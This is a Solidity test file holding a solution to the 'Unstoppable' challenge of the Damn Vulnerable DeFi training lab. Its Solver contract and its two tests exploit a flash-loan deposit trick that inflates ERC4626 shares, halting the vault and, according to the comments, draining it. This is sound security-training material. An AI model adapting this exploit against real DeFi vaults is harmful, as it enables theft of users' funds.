// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console, console2} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UnstoppableVault, Owned, ERC20} from "../../src/unstoppable/UnstoppableVault.sol";
import {UnstoppableMonitor, IERC3156FlashBorrower} from "../../src/unstoppable/UnstoppableMonitor.sol";

contract UnstoppableChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address attacker = makeAddr("attacker");

    uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18;

    DamnValuableToken public token;
    UnstoppableVault public vault;
    UnstoppableMonitor public monitorContract;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token and vault
        token = new DamnValuableToken();
        vault = new UnstoppableVault({_token: token, _owner: deployer, _feeRecipient: deployer});

        // Deposit tokens to vault
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(deployer));

        // Fund player's account with initial token balance
        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);

        // Deploy monitor contract and grant it vault's ownership
        monitorContract = new UnstoppableMonitor(address(vault));
        vault.transferOwnership(address(monitorContract));

        // Monitor checks it's possible to take a flash loan
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(true);
        monitorContract.checkFlashLoan(100e18);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Check initial token balances
        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);

        // Monitor is owned
        assertEq(monitorContract.owner(), deployer);

        // Check vault properties
        assertEq(address(vault.asset()), address(token));
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50000e18);

        // Vault is owned by monitor contract
        assertEq(vault.owner(), address(monitorContract));

        // Vault is not paused
        assertFalse(vault.paused());

        // Cannot pause the vault
        vm.expectRevert("UNAUTHORIZED");
        vault.setPause(true);

        // Cannot call monitor contract
        vm.expectRevert("UNAUTHORIZED");
        monitorContract.checkFlashLoan(100e18);
    }

    /**
     * @notice Exploits the ERC4626 share-price invariant to halt the vault and extract profit.
     * @dev Attack vector:
     *  1. Take a fee-free flash loan for up to half the vault's assets.
     *  2. During the callback, deposit player-owned tokens while totalAssets() is deflated,
     *     minting disproportionately more shares than the deposit would normally yield.
     *  3. Repay the flash loan and redeem the inflated shares for more tokens than deposited.
     *  4. The resulting share/asset mismatch causes `convertToShares(totalSupply) != balanceBefore`
     *     to revert on every subsequent flash loan, permanently halting the vault.
     *
     * Note: With ~5% of the vault's token balance an attacker could drain the vault entirely,
     * since that covers the fee charged on a max-amount loan.
     */
    function test_unstoppable() public checkSolvedByPlayer {
        Solver solver = new Solver(address(vault));
        token.transfer(address(solver), INITIAL_PLAYER_TOKEN_BALANCE);
        //maximum amount that can be taken for free
        uint256 maxFreeLoan = (vault.maxFlashLoan(address(token)) / 2) - 1;
        solver.attack(maxFreeLoan);
        solver.withdraw();
        console2.log("Player balance: ", token.balanceOf(player));
        console2.log("Vault balance: ", token.balanceOf(address(vault)));
    }

    /**
     * @notice Demonstrates a full vault drain when the attacker can afford the flash loan fee.
     * @dev The attacker acquires enough tokens to cover the 5% fee on a max-amount loan
     *  (TOKENS_IN_VAULT) plus the deposit amount. By borrowing nearly all vault assets and
     *  depositing during the deflated-totalAssets window, the attacker redeems inflated shares
     *  and withdraws the vault's entire token balance.
     */
    function test_drainVault() public {
        uint256 fee = vault.flashFee(address(token), TOKENS_IN_VAULT) + INITIAL_PLAYER_TOKEN_BALANCE;
        vm.startPrank(deployer);
        //Simulate that the attacker buys enough tokens to pay the fee
        token.transfer(attacker, fee);
        vm.stopPrank();
        vm.startPrank(attacker);
        Solver solver = new Solver(address(vault));
        token.transfer(address(solver), fee);
        // It is required to leave at least 1 ei in order to avoid zero division
        // when calculating shares to mint
        solver.attack(TOKENS_IN_VAULT - 1);
        solver.withdraw();
        console2.log("Attacker balance: ", token.balanceOf(attacker));
        console2.log("Vault balance: ", token.balanceOf(address(vault)));
        vm.stopPrank();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // Flashloan check must fail
        vm.prank(deployer);
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(false);
        monitorContract.checkFlashLoan(100e18);

        // And now the monitor paused the vault and transferred ownership to deployer
        assertTrue(vault.paused(), "Vault is not paused");
        assertEq(vault.owner(), deployer, "Vault did not change owner");
    }
}

/**
 * @title Solver
 * @notice Flash-loan receiver that exploits the UnstoppableVault share-price invariant.
 * @dev Workflow:
 *  - `attack()` initiates a flash loan and, upon repayment, redeems the inflated shares.
 *  - `onFlashLoan()` deposits tokens while totalAssets() is deflated by the outstanding loan,
 *    minting shares at an artificially favourable rate.
 *  - `withdraw()` transfers all recovered tokens back to the contract owner.
 */
contract Solver is Owned, IERC3156FlashBorrower {
    UnstoppableVault private immutable vault;
    uint256 shares;
    uint256 constant DEPOSIT_AMOUNT = 10e18;
    ERC20 asset;

    error UnexpectedFlashLoan();

    event FlashLoanStatus(bool success);

    constructor(address _vault) Owned(msg.sender) {
        vault = UnstoppableVault(_vault);
        shares = 0;
        asset = vault.asset();
    }

    /// @inheritdoc IERC3156FlashBorrower
    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        if (initiator != address(this) || msg.sender != address(vault) || token != address(vault.asset())) {
            revert UnexpectedFlashLoan();
        }

        // Deposit while totalAssets() is deflated to mint inflated shares
        ERC20(token).approve(address(vault), DEPOSIT_AMOUNT);
        shares = vault.deposit(DEPOSIT_AMOUNT, address(this));

        // Approve vault to pull back the loaned amount plus any fee
        ERC20(token).approve(address(vault), amount + fee);

        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }

    /// @notice Initiates the flash loan and redeems the inflated shares.
    function attack(uint256 amount) external {
        vault.flashLoan(this, address(asset), amount, "");
        vault.redeem(shares, address(this), address(this));
    }

    /// @notice Transfers all recovered tokens back to the owner.
    function withdraw() external {
        require(msg.sender == owner);
        asset.transfer(msg.sender, asset.balanceOf(address(this)));
    }
}
